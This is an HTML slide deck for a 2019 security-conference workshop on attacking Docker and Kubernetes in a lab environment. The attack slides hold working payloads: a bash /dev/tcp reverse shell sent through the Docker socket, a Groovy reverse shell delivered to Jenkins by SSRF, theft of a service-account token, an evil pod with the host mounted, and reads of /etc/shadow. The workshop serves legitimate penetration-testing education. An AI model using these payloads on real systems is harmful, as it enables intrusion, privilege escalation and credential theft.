<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<title>reveal.js</title>

		<link rel="stylesheet" href="css/reset.css">
		<link rel="stylesheet" href="css/reveal.css">
		<link rel="stylesheet" href="css/theme/blood.css">

		<!-- Theme used for syntax highlighting of code -->
		<link rel="stylesheet" href="lib/css/monokai.css">

		<!-- Printing and PDF exports -->
		<script>
			var link = document.createElement( 'link' );
			link.rel = 'stylesheet';
			link.type = 'text/css';
			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
			document.getElementsByTagName( 'head' )[0].appendChild( link );
		</script>
	</head>
	<body>
		<div class="reveal">
			<div class="slides">
				<section data-background="./shippingyardgif.gif">
					<section data-markdown>
						## Professionally 
						# Evil 
					</section>
					<section data-markdown>
						# Container Hackery 
					</section>
					<section>
						By Cory Sabol
					</section>
				</section>
				<section data-markdown>
					## About Me
					I'm a Security Consultant and Software Developer for Secure Ideas, LLC.
				</section>
				<section>
					<section data-markdown>
						## What are we doing here today?
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Well allow me to fill you in 
							Today we are going to <!-- .element: class="fragment" data-fragment-index="1" -->
							- Learn some basics about containers and docker as well as a little bit about Kubernetes (k8s) <!-- .element: class="fragment" data-fragment-index="2" -->
							- Examine some techniques that you might use on a penetration test when confronted with container solutions <!-- .element: class="fragment" data-fragment-index="3" -->
							- Hack Kubernetes cluster! <!-- .element: class="fragment" data-fragment-index="4" -->
						</script>
					</section>
				</section>
				<section>
					<section data-markdown>
						## Lab Setup
					</section>
					<section data-markdown>
						#### Make Sure you have the SamuraiWTF OVA up and running
					</section>
					<section data-markdown>
						Log in with the following creds.
						- Username: samurai 
						- Password: samurai 
					</section>
					<section data-markdown>
						Once you've logged in, open up a terminal and run the following commands.

						```bash
						sudo su
						minikube start --vm-driver=none
						kubectl apply -f /opt/samurai/arrrspace/k8s-resources
						kubectl get pods
						```
					</section>
				</section>
				<section>
					<section data-markdown>
						## What is a Container?
					</section>
					<section data-markdown>
						#### First off, a container is not a Virtual Machine.
						[But sometimes they are. Just not in the way you might be thinking.]("https://github.com/kata-containers/documentation/blob/master/design/architecture.md")
					</section>
					<section data-markdown>	
						The definition given on the Kubernetes web site is actually really good:

						> A lightweight and portable executable image that contains software and all of its dependencies.
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Containers
							- are typically Lightweight (although they don't have to be) <!-- .element: class="fragment" data-fragment-index="1" -->
							- provide isolation <!-- .element: class="fragment" data-fragment-index="2" -->
							- reproducible <!-- .element: class="fragment" data-fragment-index="3" -->
							- share the kernel with the host <!-- .element: class="fragment" data-fragment-index="4" -->
							- have their resources managed by the host kernel <!-- .element: class="fragment" data-fragment-index="5" -->
						</script>
					</section>
					<section data-markdown>
						#### Containers generally rely on kernel level constructs
					</section>
					<section data-markdown>
						#### Cgroups are the primary example 
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Cgroups - Control Groups 
							- invented at Google circa 2006 <!-- .element: class="fragment" data-fragment-index="1" -->
							- limit the resource usage of processes <!-- .element: class="fragment" data-fragment-index="2" -->
							- CPU, RAM, etc <!-- .element: class="fragment" data-fragment-index="3" -->
						</script>
					</section>
					<section data-markdown>
						#### Cgroup Namespaces
					</section>
					<section data-markdown>
						<script type="text/template">
							- PID Namespace: Processes in one namespace are unaware of processess in other namespaces
							- Network Namespace: network interface controllers, iptrable rules, routing tables, etc are isolated from other network namespaces <!-- .element: class="fragment" data-fragment-index="1" -->
							- Mount Namespace: allows creating different filesystem layouts and making mount points read-only, etc <!-- .element: class="fragment" data-fragment-index="2" -->
							- IPC Namespace: isolates the System V inter-process communication between namespaces <!-- .element: class="fragment" data-fragment-index="3" -->
							- User Namespace: isolates the user IDs between namespaces <!-- .element: class="fragment" data-fragment-index="4" -->
							- this list is not exhaustive <!-- .element: class="fragment" data-fragment-index="5" -->
						</script>
					</section>
				</section>
				<section>
					<section data-markdown>
						## What is Docker 
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Docker is
							- a CLI tool for creating and managing containers <!-- .element: class="fragment" data-fragment-index="1" -->
							- a daemon that is responsible for <!-- .element: class="fragment" data-fragment-index="2" -->
								- creating containers <!-- .element: class="fragment" data-fragment-index="3" -->
								- interacting containers <!-- .element: class="fragment" data-fragment-index="4" -->
								- building images <!-- .element: class="fragment" data-fragment-index="5" -->
								- networking containers <!-- .element: class="fragment" data-fragment-index="6" -->
								- and more <!-- .element: class="fragment" data-fragment-index="7" -->
							- the CLI tool communicates via a RESTful api that is exposed through the docker.sock unix socket <!-- .element: class="fragment" data-fragment-index="8" -->
						</script>
					</section>
					<section data-markdown>
						#### Let's try out some simple docker commands!
						```bash
						docker run -it alpine /bin/ash
						docker ps -a
						docker images -a
						docker exec -it container_name cmd
						docker kill container_name
						```
						
						When in doubt just read the documentation.
					</section>
				</section>
				<section>
					<section data-markdown>
						## Okay, but what is Kubernetes
					</section>
					<section data-markdown>
						#### From kubernetes.io

						> Kubernetes (k8s) is an open-source system for automating deployment,
						> scaling, and management of containerized applications.
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Some k8s terms
							- cluster: set of machines, called nodes the run containers managed by k8s <!-- .element: class="fragment" data-fragment-index="1" -->
							- pod: the base k8s object, represents a set of running containers on a cluster <!-- .element: class="fragment" data-fragment-index="2" -->
							- deployment: an API object which manages a replicated application <!-- .element: class="fragment" data-fragment-index="3" -->
							- service: an API object which describes how to access applications <!-- .element: class="fragment" data-fragment-index="4" -->
						</script>
					</section>
					<section data-markdown>
						<script type="text/template">
							#### k8s terms cont.
							- node: worker maching in a k8s cluster, can be a VM or a physical machines <!-- .element: class="fragment" data-fragment-index="5" -->
								- or in our case a docker container :) <!-- .element: class="fragment" data-fragment-index="6" -->
							- namespaces: virtual clusters backed by the same physical cluster <!-- .element: class="fragment" data-fragment-index="7" -->
							- kube-apiserver: component on the master that exposes the k8s API <!-- .element: class="fragment" data-fragment-index="8" -->

						</script>
					</section>
					<section data-markdown>
						When in doubt RTFM [k8s concepts](https://kubernetes.io/docs/concepts/)

						Also see [k8s glossary](https://kubernetes.io/docs/reference/glossary/?fundamental=true)
					</section>
				</section>
				<section>
					<section data-markdown data-background="./lolhtml.jpg">
						## Time for the good stuff now!
					</section>
					<section data-markdown data-background="./lolhtml.jpg">
						## Hacking Stuff!
						(obligatory stock "hacking" image)
					</section>
				</section>
				<section>
					<section data-markdown>
						### Attacking the Docker socket

						![](./wowzers.png)
					</section>
					<section data-markdown>
						#### Scenario:

						We've popped some web app or something and we're sitting here with a command shell on the server.
						Let's do some poking around, maybe this container happens to have the docker socket mounted to it!
					</section>
					<section data-markdown>
						#### Setup
						```bash
						docker run --rm -it \
							-v /var/run/docker.sock:/var/run/docker.sock \
							dockerlabbase /bin/bash
						```
					</section>
					<section data-markdown>
						#### A little bit of recon
						```bash
						cat /proc/1/cgroup | grep -E -i ":/docker/"
						find "/" -name docker.sock 2>&1
						grep "Name:" /mnt/host/proc/*/status
						```
					</section>
					<section data-markdown>
						#### Exploitation
						```bash
						curl -s -XGET --unix-socket /run/docker.sock \
							http://localhost/containers/json
						curl --unix-socket /run/docker.sock \
							http://localhost/images/json
						```
					</section>
					<section data-markdown>
						#### Exploitation cont.
						```
						read -r -d '' CONTAINER_JSON << EOF
						{
							"Image":"ubuntu",
							"Cmd":["bash","-c","bash -i >& /dev/tcp/x.x.x.x/4444 0>&1"],
							"DetachKeys":"Ctrl-p,Ctrl-q",
							"OpenStdin":true,
							"Mounts":[{"Type":"bind","Source":"/","Target":"/mnt/host"}]
						}
						EOF
						curl -XPOST --unix-socket /run/docker.sock \
							-H "Content-Type:application/json" -d "$CONTAINER_JSON" \
							http://localhost/containers/create
						curl -XPOST --unix-socket /run/docker.sock \
							http://localhost/containers/$CONTAINER_ID/start
						```
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Explanation
							- Identified that we were in a Docker container <!-- .element: class="fragment" data-fragment-index="1" -->
							- Located the Docker socket which happened to be mounted to the container <!-- .element: class="fragment" data-fragment-index="2" -->
							- Used the docker socker to recon what containers and images are on the host system <!-- .element: class="fragment" data-fragment-index="3" -->
							- Used the docker socket to create our own malicious container with the host file system bind mounted and a reverse shell connection <!-- .element: class="fragment" data-fragment-index="4" -->
						</script>
					</section>
				</section>
				<section>
					<section data-markdown>
						### Exploiting the Docker group
					</section>
					<section data-markdown>
						#### Scenario:
						We've yet again popped a box and we're sitting here with a command shell on the server.
						Only this time we're a user with pretty basic privs... However, this user is in the **docker group**.
					</section>
					<section data-markdown>
						#### Some setup
						```bash
						su quill
						bash
						```
					</section>
					<section data-markdown>
						#### Recon
						```bash
						id
						cat /etc/shadow
						groups | grep "docker"
						docker ps -a 
						docker images -a
						```
					</section>
					<section data-markdown>
						#### Exploitation
						```bash	
						docker run -it --privileged \
							--net=host \
							--ipc=host \
							-v /:/host \
							busybox chroot /host
						```
						[The most pointless docker command ever](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/)
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Explanation
							- Figured out what user we were <!-- .element: class="fragment" data-fragment-index="1" -->
							- Found that we don't have very many permissions <!-- .element: class="fragment" data-fragment-index="2" -->
							- Found that we belong to the docker group <!-- .element: class="fragment" data-fragment-index="3" -->
							- Leverage our ability to run docker to elevate our privileges to root <!-- .element: class="fragment" data-fragment-index="4" -->
						</script>
					</section>
				</section>
				<section>
					<section data-markdown>
						# It's time for the main event
					</section>
					<section data-markdown>
						### Attacking a Kubernetes Cluster
					</section>
					<section data-markdown>
						#### Scenario
						We've been hired to pentest the Arrrspace web app. A janky social media platform for cyber pirates.
						We begin by mapping out the web application to learn how it works and what systems it interacts with.
						Little do we know that there is more to this application than meets the eye...
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Let's get setup
							- Fire up BurpSuite: applications -> Samurai WTF -> Burp Suite <!-- .element: class="fragment" data-fragment-index="1" -->
							- Create a temp project <!-- .element: class="fragment" data-fragment-index="2" -->
							- Configure your scope to allow ^*arrrspace.wtf <!-- .element: class="fragment" data-fragment-index="3" -->
							- Open up Chrome: applications -> Internet -> Google Chrome <!-- .element: class="fragment" data-fragment-index="4" -->
							- Set the Foxy Proxy plugin to 127.0.0.1:8080 <!-- .element: class="fragment" data-fragment-index="5" -->
							- Navigate to arrrspace.wtf <!-- .element: class="fragment" data-fragment-index="6" -->
						</script>
					</section>
					<section data-markdown>
						#### Mapping
						Map out the web application by simply browsing to every part of it that you can.
						This is standard web application pentesting practice.
					</section>
					<section data-markdown>
						<script type="text/template">
							#### Discovery
							Through our mapping we should see that the web applicaiton makes a request to api.arrrspace.wtf
							Let's poke at that api a bit further <!-- .element: class="fragment" data-fragment-index="1" -->
						</script>
					</section>
					<section data-markdown>
						#### Digging a little deeper
						In a real pentest we would try to tease out a lot more intereseting behaviours then we're going to do today.
						Instead we're just going to skip stright to doing some automated discovery for hidden headers.
						Doing this is useful, we want to find a way to force the API to make requests that it shouldn't, allowing us to 
						get a feeling for what lives behind it.
					</section>
					<section data-markdown>
						#### Automated Discover
						Eventually through a combination of educated guessing more manual request tampering and continued automated
						discovery we should be able to put it together that the the API will forward requests using a combination of the
						X-Original-Host HTTP header
						</script>
					</section>
					<section data-markdown>
						#### Exploitation 1 - She pops shells down by the seashore
						By now we've discovered that there is a default Jenkins instance sitting behind the API gateway.
						We've also figured out that we can make requests to the Kuberentes API by way of the API gateway.
						At this point there are a few paths we could take. One is clean, they other dirty. The dirty way is more
						run, so let's do that :)
					</section>
					<section data-markdown>
						#### Exploitation 1 Cont.
						Start up a netcat listener on your attack machine and then repeat the following HTTP request with BurpSuite.
						```
						POST / HTTP/1.1
						Host: api.arrrspace.wtf
						X-Original-Host: http://jenkinssvc:8080/scriptText
						Content-Type: application/x-www-form-urlencoded
						Content-Length: 566

						script=String host="10.0.2.15";
						int port=4444;
						String cmd="bash";
						Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
						Socket s=new Socket(host,port);
						InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();
						while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};
						p.destroy();s.close();
						```
					</section>
					<section data-markdown>
						#### Upgrade our shell
						```
						# In reverse shell
						python -c 'import pty; pty.spawn("/bin/bash")'
						Ctrl-Z
						# On your attack box 
						stty --all # note the rows and columns
						stty raw -echo
						fg
						# In reverse shell
						reset
						export SHELL=bash
						export TERM=xterm-256color
						stty rows n columns n 
						```
					</section>
					<section data-markdown>
						#### Infiltrate enum4k8s
						On the host machine start run the following in the /home/samurai/tools dir
						```python
						python -m SimpleHTTPServer  
						```
						Now in your reverse shell run the following
						```bash
						# find a writable directory
						find / -writable
						# in chosen dir
						curl -fsSL http://10.0.2.15:8000/ek4 -o .e4k
						chmod +x e4k && ./e4k -h
						```
					</section>
					<section data-markdown>
						#### Enumerating the cluster from the inside
						We can gather some useful info about the cluster from inside the jenkinssvc pod
						```bash
						ENV
						./e4k
						export T=$(cat /var/run/secrets/kubernetes.io/serviceaccoutn/token)
						```
					</section>
					<section data-markdown>
						#### Wait, what was that last one?
						Yeah, we just read the jenkinssvc's cluster service account JWT into an env variable :)
						Let's do some enumeration now, and see what this serviceaccount can do
						```bash
						./e4k -jwt $T > cluster_enum.txt
						./e4k -jwt $T -dump > cluster_enum.dump
						```
						We could also be cheeky an inflitrate kubectl itself >:)
					</section>
					<section data-markdown>
						#### Let's Deploy an evil pod
						The last thing we're going to do in this workshop is deploy a pod that runs a 
						reverse shell on startup and has the host root fs mounted as a bidirectional bind
						mount to the pod containers.
						```bash
						./e4k -jwt $T -deploy \
							-img ubuntu \
							-cmd '["bash","-c","bash -i >& /dev/tcp/10.0.2.15/5555 0>&1"]' \
							-name foo
						```
						P.S. we could have used kubectl do acheive a similar result with a few extra steps.
						Also, I aim to improve this tool a lot more going forwards, it's a bit of a chore to use...
					</section>
					<section data-markdown>
						#### Well, let's compromise the host system of this node!
						```
						# in reverse shell
						cat /mnt/host/etc/shadow
						echo "I'm mary poppins ya'll" > /mnt/host/etc/yonduwuzhere.txt
						# on your host
						ls -l /etc/yonduwuzhere.txt
						sudo cat /etc/yonduwuzhere.txt
						```
					</section>
				</section>
				<section data-markdown>
					# That's it folks!
				</section>
				<section data-markdown>
					We barely scratched the surface of the things that we could do, but hopefully you
					had some fun, and learned a few new tricks!
				</section>
				<section data-markdown>
					## I'd like to thank
					- My employer [Secure Ideas, LLC](www.secureideas.com)
						- I'm biased, but if you want good pentests then check us out :)
					- Everybody that I get to work with every day, because they all rock
					- Everybody who attended the workshop
				</section>
				<section data-markdown>
					# And last but not least...
				</section>
				<section data-markdown>
					## The organizers of this years (2019) [GrrCON](http://grrcon.com)
				</section>
				<section>
					<section data-markdown>
						# Contact Info
					</section>
					<section data-markdown>
						- Email: cory@secureideas.com
						- Twitter: [@84d93r](www.twitter.com/84d93r)
						- Carrier Pigeon: It just knows where to go, okay
						- Lat,Lon of my secret base: [24.9999993,-71.0087548](https://www.google.com/maps/place/Bermuda+Triangle/@24.9999993,-71.0087548,15z/data=!4m13!1m7!3m6!1s0x89451ab5034cb7ab:0xb600ecf3df7aca4d!2sBermuda+Triangle!3b1!8m2!3d25!4d-71!3m4!1s0x89451ab5034cb7ab:0xb600ecf3df7aca4d!8m2!3d25!4d-71)
							- No solicitation, please
						- [Arrrspace Github](https://github.com/ProfessionallyEvil/arrrspace)
						- [SamuraiWTF Github](https://github.com/SamuraiWTF/samuraiwtf)
						- [Harpoon Github](https://github.com/ProfessionallyEvil/harpoon)
					</section>
				</section>
			</div>
		</div>

		<script src="js/reveal.js"></script>

		<script>
			// More info about config & dependencies:
			// - https://github.com/hakimel/reveal.js#configuration
			// - https://github.com/hakimel/reveal.js#dependencies
			Reveal.initialize({
				dependencies: [
					{ src: 'plugin/markdown/marked.js' },
					{ src: 'plugin/markdown/markdown.js' },
					{ src: 'plugin/notes/notes.js', async: true },
					{ src: 'plugin/highlight/highlight.js', async: true }
				]
			});
		</script>
		<style type="text/css">
			#footer-left {
				position: absolute;
				bottom: 0%;
				left: 0%;
				width: 50%;
				max-width: 50%;
				height: 125px;
			}
		</style>
		<div id="hidden" style="display:none;">
			<div id="header">
				<div id="footer-left">
					<img src="./SI_Logo.png" />
				</div>
			</div>
		</div>
		<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
		<script type="text/javascript">
			var header = $('#header').html();
			$('div.reveal').append(header);
		</script>
	</body>
</html>
